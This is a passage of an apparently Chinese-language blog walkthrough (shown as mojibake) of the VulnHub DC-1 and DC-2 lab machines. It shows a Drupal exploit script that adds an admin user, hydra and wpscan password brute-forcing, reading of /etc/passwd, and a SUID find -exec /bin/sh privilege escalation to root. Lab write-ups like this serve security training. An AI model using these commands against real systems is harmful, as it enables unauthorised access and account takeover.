<h3 id="2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·"><a href="#2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·" class="headerlink" title="2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·"></a>2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</h3><p>ä¼˜ç‚¹æ˜¯æ›´åŠ æ–¹ä¾¿ï¼Œå¿«æ·ï¼Œ<strong>ä½†æ˜¯è„šæœ¬ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œåªæœ‰è‡ªå·±æ˜ç™½åŸç†æ‰æ˜¯çœŸæ­£æŒæ¡</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure></div>

<p>è¯¥ç½‘ç«™åœ¨kalié‡Œé¢æµè§ˆå™¨ä¹¦ç­¾è‡ªå¸¦çš„ï¼Œè¿™ä¸ªè„šæœ¬é€‚ç”¨äºdrupalï¼Œç›´æ¥ä¸‹è½½ä¸‹æ¥ç”¨å³å¯</p>
<p><img src="/2022/08/29/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></p>
<p>ä¸‹è½½å¥½åï¼Œè¿è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">pytho<span class="symbol">n2</span> <span class="number">34992.</span>py -t http:<span class="comment">//192.168.133.136 -u admin001 -p 123456</span></span><br><span class="line"></span><br><span class="line">-tå°±æ˜¯ç›®æ ‡ç½‘ç«™ï¼Œ-uå°±æ˜¯æ–°å»ºçš„ç”¨æˆ·åï¼Œ-på°±æ˜¯ç”¨æˆ·åå¯†ç </span><br><span class="line">*æ³¨æ„è¿™ä¸ªè„šæœ¬éœ€è¦ pytho<span class="symbol">n2</span>è¿è¡Œï¼Œpytho<span class="symbol">n3</span>è¯­æ³•ä¸ç¬¦åˆ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></p>
<p>ç„¶åæŒ‰ç…§è¾“å…¥çš„ï¼Œç›´æ¥ç™»å½•å°±å¯ä»¥äº†ï¼Œæˆ–è€…ç›´æ¥ç‚¹å‡»ä¸‹é¢é“¾æ¥</p>
<p><img src="/2022/08/29/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></p>
<p>å°±å¯ä»¥æ‹¿åˆ°<code>Flag3</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></p>
<hr>
<h2 id="Flag4"><a href="#Flag4" class="headerlink" title="Flag4"></a>Flag4</h2><h3 id="1ï¼‰ä¸ªäººæ–¹æ³•"><a href="#1ï¼‰ä¸ªäººæ–¹æ³•" class="headerlink" title="1ï¼‰ä¸ªäººæ–¹æ³•"></a>1ï¼‰ä¸ªäººæ–¹æ³•</h3><p>åˆ†æä¸€ä¸‹flag3</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but yo<span class="string">u&#x27;ll need to -exec that command to work out how to get what&#x27;</span>s <span class="keyword">in</span> the shadow.</span><br><span class="line"></span><br><span class="line">æ„æ€æ˜¯ï¼šSpecial PERMSç‰¹åˆ«çš„æƒé™ï¼ˆåº”è¯¥æ˜¯rootæƒé™ï¼‰ï¼Œpasswdåº”è¯¥æ˜¯æŸ¥çœ‹<span class="regexp">/etc/</span>passwdç›®å½•ï¼ŒFINDæ„æ€åˆ©ç”¨findå‘½ä»¤ï¼Œ-execå°±æ˜¯éœ€è¦ç”¨å®ƒæ‰§è¡Œå‘½ä»¤ï¼Œ get what<span class="string">&#x27;s in the shadowæ„æ€æ˜¯flag4åœ¨/etc/shadowé‡Œ</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å…ˆçœ‹çœ‹etcç›®å½•</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163045108.png" alt="image-20220830163045108"></p>
<p>å‘ç°äº†passwdæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> passwd</span><br></pre></td></tr></table></figure></div>

<p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<p>å‘ç°æœ‰flag4çš„çº¿ç´¢</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163220380.png" alt="image-20220830163220380"></p>
<p>flag4æ˜¯åœ¨/home/flag4é‡Œé¢ï¼Œæˆ‘ä»¬åˆ°ç›®å½•é‡Œçœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cd <span class="regexp">/home/</span>flag4</span><br></pre></td></tr></table></figure></div>

<p>å‘ç°æœ‰ä¸ªflag4.txtï¼ŒæŸ¥çœ‹</p>
<p><img src="/2022/08/29/vulnhub/image-20220830163358828.png" alt="image-20220830163358828"></p>
<p>å¾—åˆ°flag4</p>
<h3 id="2ï¼‰å®˜æ–¹æ–¹æ³•"><a href="#2ï¼‰å®˜æ–¹æ–¹æ³•" class="headerlink" title="2ï¼‰å®˜æ–¹æ–¹æ³•"></a>2ï¼‰å®˜æ–¹æ–¹æ³•</h3><p>ç”¨äº†hydra[ä¹å¤´è›‡]å·¥å…·ï¼Œå¯¹æˆ‘ä»¬åœ¨passwdé‡Œçœ‹åˆ°flag4ç”¨æˆ·è¿›è¡Œçˆ†ç ´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-læ˜¯æŒ‡å®šç”¨æˆ·æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼Œ-pæ˜¯æŒ‡å®šå¯†ç æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œsshå°±æ˜¯</span><br><span class="line">ç”¨æˆ·æ‰€åœ¨çš„ç½‘ç«™</span><br><span class="line"></span><br><span class="line">ä¸Šé¢-pçš„æ–‡ä»¶æ˜¯è‡ªå·±ä¸‹è½½çš„å¯†ç åŒ…</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>è¿™é‡Œå°±çœ‹åˆ°flag4ç”¨æˆ·çš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯orange</p>
<p>ç„¶åç”¨sshè¿æ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">ç„¶åyes</span><br><span class="line">ç„¶åè¾“å…¥å¯†ç ï¼šorange</span><br></pre></td></tr></table></figure></div>

<p>è¿›å…¥flag4ç”¨æˆ·é¡µé¢ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cat fla<span class="name">g4.</span>txt</span><br><span class="line">å¾—åˆ°fla<span class="name">g4</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></p>
<hr>
<h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OXYGENE"><figure class="iseeu highlight /oxygene"><table><tr><td class="code"><pre><span class="line">åˆ†æä¸€ä¸‹flag5</span><br><span class="line">Can you use this same <span class="keyword">method</span> <span class="title function_">to</span> <span class="title function_">find</span> <span class="title function_">or</span> <span class="title function_">access</span> <span class="title function_">the</span> <span class="title function_">flag</span> <span class="title function_">in</span> <span class="title function_">root</span>?</span><br><span class="line"></span><br><span class="line"><span class="title function_">Probably</span>. <span class="title function_">But</span> <span class="title function_">perhaps</span> <span class="title function_">it</span>&#x27;<span class="title function_">s</span> <span class="title function_">not</span> <span class="title function_">that</span> <span class="title function_">easy</span>.  <span class="title function_">Or</span> <span class="title function_">maybe</span> <span class="title function_">it</span> <span class="title function_">is</span>?</span><br><span class="line"></span><br><span class="line">æ„æ€æ˜¯ï¼šæ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æŸ¥æ‰¾æˆ–è®¿é—®æ ¹ç›®å½•ä¸­çš„æ ‡å¿—å—ï¼Ÿ</span><br><span class="line"></span><br><span class="line">å¯èƒ½ä½†ä¹Ÿè®¸è¿™å¹¶ä¸å®¹æ˜“ã€‚ä¹Ÿè®¸æ˜¯è¿™æ ·ï¼Ÿ</span><br></pre></td></tr></table></figure></div>

<p>rootåº”è¯¥å°±æ˜¯éœ€è¦ææƒäº†</p>
<h3 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h3><p>linuxææƒæ“ä½œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘çš„<code>WEBéšç¬”</code>é‡Œ<code>suid</code>ææƒï¼Œä¸‹é¢åªè®°å½•æµç¨‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span>ï¼ŒæŸ¥çœ‹ç›®å½•ä¸‹suidæƒé™æ‰€æœ‰å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p>å‘ç°<code>find</code>ç›®å½•</p>
<p><img src="/2022/08/29/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></p>
<p>äºæ˜¯å¯ä»¥åˆ©ç”¨findè·å–rootæƒé™shell</p>
<p>ä¸»è¦æ˜¯è¦è®©findå‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ‰¾ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å³å¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQF"><figure class="iseeu highlight /sqf"><table><tr><td class="code"><pre><span class="line">ä»¥åœ¨æ ¹ç›®å½•ä¸ºä¾‹</span><br><span class="line">è¾“å…¥<span class="built_in">find</span> / -<span class="built_in">name</span> initrd.img -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure></div>

<p>ææƒæˆåŠŸ</p>
<p><img src="/2022/08/29/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></p>
<p>æˆ‘ä»¬åœ¨flag4é‡ŒçŸ¥é“ï¼Œæœ€åçš„æ——å­åœ¨rootç›®å½•é‡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> /root;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p>å‘ç°<code>thefinalflag.txt</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="comment">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"></span><br><span class="line">You can <span class="keyword">let</span> <span class="keyword">me</span> know what you thought <span class="keyword">of</span> this little journey</span><br><span class="line"><span class="keyword">by</span> contacting <span class="keyword">me</span> via Twitter - @DCAU7</span><br><span class="line">æ„æ€æ˜¯ï¼š</span><br><span class="line">åšå¾—å¥½ï¼ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">å¸Œæœ›ä½ å–œæ¬¢è¿™ä¸€ç‚¹ï¼Œå¹¶å­¦ä¹ äº†ä¸€äº›æ–°æŠ€èƒ½ã€‚</span><br><span class="line"></span><br><span class="line">ä½ å¯ä»¥å‘Šè¯‰æˆ‘ä½ å¯¹è¿™æ¬¡å°æ—…è¡Œçš„çœ‹æ³•</span><br><span class="line">é€šè¿‡Twitterè”ç³»æˆ‘-@DCAU7 </span><br></pre></td></tr></table></figure></div>

<p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1 id="äºŒã€DC-2-åˆçº§"><a href="#äºŒã€DC-2-åˆçº§" class="headerlink" title="äºŒã€DC-2[åˆçº§]"></a>äºŒã€DC-2[åˆçº§]</h1><p><strong>five flags</strong></p>
<p> å…ˆç”¨nmapæ‰«æä¸€äº›</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">è¾“å…¥nmap -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">133.138</span></span><br></pre></td></tr></table></figure></div>

<p>å‘ç°å†…å®¹å¤ªå°‘äº†</p>
<p><img src="/2022/08/29/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">è¾“å…¥nmap -<span class="selector-tag">p</span>- <span class="number">192.168</span>.<span class="number">133.138</span> -<span class="selector-tag">A</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p>
<p>å‘ç°7744ç«¯å£è¿è¡Œçš„sshï¼Œ22ç«¯å£è¢«æ¢äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Ssh</span>æ˜¯ä¸€ä¸ªå®‰å…¨çš„è¿œç¨‹ç™»å½•åè®®,å®ƒçš„ç«¯å£å·é»˜è®¤æ˜¯<span class="number">22</span>ç«¯å£</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">SSH ä¸º Secure <span class="keyword">Shell </span>çš„ç¼©å†™ï¼Œç”± IETF çš„ç½‘ç»œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼›SSH ä¸ºå»ºç«‹åœ¨åº”ç”¨å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ã€‚SSH æ˜¯è¾ƒå¯é ï¼Œä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›å®‰å…¨æ€§çš„åè®®ã€‚åˆ©ç”¨ SSH åè®®å¯ä»¥æœ‰æ•ˆé˜²æ­¢è¿œç¨‹ç®¡ç†è¿‡ç¨‹ä¸­çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚SSHæœ€åˆæ˜¯UNIXç³»ç»Ÿä¸Šçš„ä¸€ä¸ªç¨‹åºï¼Œåæ¥åˆè¿…é€Ÿæ‰©å±•åˆ°å…¶ä»–æ“ä½œå¹³å°ã€‚SSHåœ¨æ­£ç¡®ä½¿ç”¨æ—¶å¯å¼¥è¡¥ç½‘ç»œä¸­çš„æ¼æ´ã€‚SSHå®¢æˆ·ç«¯é€‚ç”¨äºå¤šç§å¹³å°ã€‚å‡ ä¹æ‰€æœ‰UNIXå¹³å°â€”åŒ…æ‹¬HP-UXã€Linuxã€AIXã€Solarisã€<span class="keyword">Digital </span>UNIXã€Irixï¼Œä»¥åŠå…¶ä»–å¹³å°ï¼Œéƒ½å¯è¿è¡ŒSSHã€‚</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬è¯•è¯•è®¿é—®æˆ‘ä»¬çš„é¶æœºipï¼š<code>192.168.133.138</code></p>
<hr>
<p>ä½†æ˜¯è®¿é—®å¤±è´¥ã€å¦‚æœæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å¿½ç•¥ã€‘</p>
<p><img src="/2022/08/29/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè®¿é—®IPçš„æ—¶å€™è¿›è¡Œäº†ä¸€ä¸ªè·³è½¬ï¼Œè·³è½¬åˆ°äº†<code>http://dc-2</code>ï¼Œä¸”æ— æ³•è®¿é—®</p>
<p>æˆ‘çŒœæµ‹æ˜¯<code>hosts</code>æ–‡ä»¶æ²¡æœ‰ä¿®æ”¹ï¼Œæ‰€ä»¥åŸŸåæ— æ³•ç™»å½•</p>
<p>éœ€è¦åœ¨<code>hosts</code>å…¶ä¸­æ·»åŠ åŸŸåï¼š<code>http://dc-2</code>å’Œå…¶ipï¼š<code>192.168.133.138</code>ï¼Œ<code>dns</code>æ‰èƒ½æ­£å¸¸è½¬æ¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥vi <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></p>
<p>å‘å…¶ä¸­æ·»åŠ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></p>
<p>åˆ·æ–°æµè§ˆå™¨ï¼Œå†æ¬¡è®¿é—®<code>192.168.133.138</code>æˆ–<code>http://dc-2</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></p>
<p>æˆåŠŸè¿æ¥</p>
<hr>
<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>è¿›å…¥ç½‘é¡µå°±çœ‹åˆ°flagäº†</p>
<p><img src="/2022/08/29/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></p>
<p>ç‚¹å‡»æ‰“å¼€æŸ¥çœ‹</p>
<p><img src="/2022/08/29/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">	</span><br><span class="line"></span><br><span class="line">Flag <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably wonâ€™t <span class="keyword">work</span>, so <span class="keyword">instead</span>, maybe you just need <span class="keyword">to</span> be cewl.</span><br><span class="line"></span><br><span class="line">More passwords <span class="keyword">is</span> <span class="keyword">always</span> better, but sometimes you just canâ€™t win them <span class="keyword">all</span>.</span><br><span class="line"></span><br><span class="line"><span class="keyword">Log</span> <span class="keyword">in</span> <span class="keyword">as</span> one <span class="keyword">to</span> see the next flag.</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you canâ€™t find it, <span class="keyword">log</span> <span class="keyword">in</span> <span class="keyword">as</span> another.</span><br><span class="line"></span><br><span class="line">æ„æ€æ˜¯ï¼š</span><br><span class="line">ä½ é€šå¸¸çš„å¯†ç è¡¨å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œå› æ­¤ï¼Œä¹Ÿè®¸ä½ åªéœ€è¦æˆä¸ºcewlã€‚</span><br><span class="line"></span><br><span class="line">å¯†ç è¶Šå¤šè¶Šå¥½ï¼Œä½†æœ‰æ—¶ä½ æ— æ³•èµ¢å¾—æ‰€æœ‰å¯†ç ã€‚</span><br><span class="line"></span><br><span class="line">ä½œä¸ºä¸€ä¸ªç™»å½•ä»¥æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ ‡å¿—ã€‚</span><br><span class="line"></span><br><span class="line">å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¯·ä½œä¸ºå¦ä¸€ä¸ªç™»å½•ã€‚</span><br><span class="line"><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">Â·Cewlæ˜¯ä¸€ä¸ªé€šè¿‡æŒ‡å®šurlåŠæ·±åº¦,ä½¿ç”¨çˆ¬è™«æŠ€æœ¯,ç”Ÿæˆå­—å…¸çš„ä¸€ä¸ªå·¥å…·ã€‚</span><br><span class="line"></span><br><span class="line">é‚£æˆ‘ä»¬å°±ç”¨cewlå·¥å…·è¯•ä¸€ä¸‹</span><br><span class="line">*ä¸ä¼šå·¥å…·ä¸€èˆ¬ç”¨-hå°±å¯ä»¥çŸ¥é“ä½¿ç”¨è¯´æ˜</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>æ ¹æ®flag1ï¼Œæˆ‘ä»¬ç”¨<code>cewl</code>è¯•è¯•ç”Ÿæˆå­—å…¸</p>
<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cewl http:<span class="regexp">//</span>dc-<span class="number">2</span>/ &gt;pass.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ<code>pass.txt</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> pass.txtï¼ŒæŸ¥çœ‹å†…å®¹</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>å‘ç°æ˜¯ç”Ÿæˆå¯¹åº”ç½‘ç«™çš„å¯†ç å­—å…¸</p>
<p>flag1æ•´ç†ä¿¡æ¯å¥½åƒå·®ä¸å¤šäº†ï¼Œä¸‹é¢æˆ‘ä»¬åˆ©ç”¨dc1æåˆ°çš„<code>wappalyzer</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç½‘é¡µçš„æ¡†æ¶ç»“æ„æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢</p>
<p><img src="/2022/08/29/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></p>
<p>å‘ç°ç½‘ç«™çš„<code>CMS</code>æ˜¯<code>WordPress</code>ï¼Œè¿˜å¯ä»¥çœ‹åˆ°å®ƒçš„ä¸»é¢˜æ˜¯<code>Twenty Seventeen</code></p>
<p>é‚£wordpressï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥ä¾›æˆ‘ä»¬åˆ©ç”¨å‘¢ï¼Œä¸‹é¢å°±æåŠå¦ä¸€ä¸ªå·¥å…·</p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p><code>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·,å®ƒé‡‡ç”¨Rubyç¼–å†™ èƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´,å…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´</code></p>
<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹æ€§å¯¹wordpressè¿›è¡Œæ¸—é€çœ‹çœ‹ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>ç„¶åå¾€ä¸‹çœ‹ç”¨æˆ·å</p>
<p><img src="/2022/08/29/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªï¼Œç„¶åå¯ä»¥å¤åˆ¶ä¸‹æ¥ï¼Œå¼„ä¸€ä¸ªç”¨æˆ·åçš„æ–‡æœ¬ï¼Œå’Œä¹‹å‰çš„<code>pass.txt</code>è¿™ä¸ªå¯†ç æœ¬ä¸€æ ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">è¾“å…¥vi un.txt,æŠŠadmin <span class="keyword">jerry </span>tomå¤åˆ¶è¿›å»</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>ç„¶åå°±å¯ä»¥ç»“åˆæˆ‘ä»¬çš„å¯†ç æ–‡æœ¬å’Œç”¨æˆ·åæ–‡æœ¬ï¼Œåˆ©ç”¨wpscanè¿™ä¸ªå·¥å…·ï¼Œè¿›è¡Œçˆ†ç ´æ“ä½œäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>ç¨å¾®ç­‰ä¸€ä¼š</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p>adminç”¨æˆ·å¯†ç æ²¡æœ‰æ‰¾åˆ°ï¼Œåº”è¯¥æ˜¯æœ€é«˜æƒé™çš„è´¦å·</p>
<p>ä½†æ˜¯jerryå’Œtomç”¨æˆ·çš„å¯†ç çŸ¥é“äº†</p>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬å°±è¦å¼€å§‹æ‰¾ç™»å½•çš„é¡µé¢äº†ï¼Œä¸€èˆ¬æ˜¯åå°ç½‘ç«™</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨dirsearchå·¥å…·è¿›è¡Œæ‰«æçœ‹çœ‹</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></p>
<p>å‘ç°ç½‘ç«™</p>
<p><img src="/2022/08/29/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p>
<p>ç”¨æˆ‘ä»¬ä¹‹å‰è·å¾—çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•è¯•è¯•</p>
<p>ä»¥<code>jerry</code>ä¸ºä¾‹ï¼Œå¥½åƒç”¨<code>tom</code>ä¼šæ˜¾ç¤ºå¯†ç é”™è¯¯</p>
<p>åœ¨pageçª—å£å‘ç°flag2</p>
